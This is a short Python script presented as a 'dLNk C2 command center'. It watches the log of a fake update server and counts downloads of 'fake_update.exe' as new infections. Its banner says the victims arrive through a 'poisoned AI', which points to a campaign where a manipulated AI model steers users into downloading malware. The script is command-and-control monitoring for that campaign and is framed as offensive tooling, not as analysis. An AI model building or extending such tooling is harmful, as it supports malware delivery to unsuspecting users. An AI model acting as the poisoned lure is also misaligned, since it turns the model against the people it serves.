import time
import os
import re

# CONFIGURATION
LOG_FILE = "update_server.log" # Log file from fake_update_server.py

def monitor_c2():
    print("--- [ dLNk C2 COMMAND CENTER ] ---")
    print("[*] Monitoring for incoming infections from poisoned AI...")
    
    unique_victims = set()
    total_hits = 0
    
    if not os.path.exists(LOG_FILE):
        print("[!] No logs found yet. Waiting for server activity...")
    
    try:
        while True:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    lines = f.readlines()
                    
                # Scan for our "Callback" signature (fake_update.exe or specific URL)
                current_hits = 0
                for line in lines:
                    if "fake_update.exe" in line or "GET / " in line:
                         current_hits += 1
                         # Extract IP (Simplified regex for demo)
                         # In real log: "[2025-...] Incoming Request: ..." -> need to parse IP if available
                         # Since simple http server doesn't log IP in file by default easily without mod,
                         # we assume every line with our payload is a hit.
                         pass

                if current_hits > total_hits:
                    new_victims = current_hits - total_hits
                    print(f"[+] NEW INFECTION SIGNAL! (+{new_victims} hits)")
                    total_hits = current_hits
                    
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] C2 Monitor stopped.")

if __name__ == "__main__":
    monitor_c2()
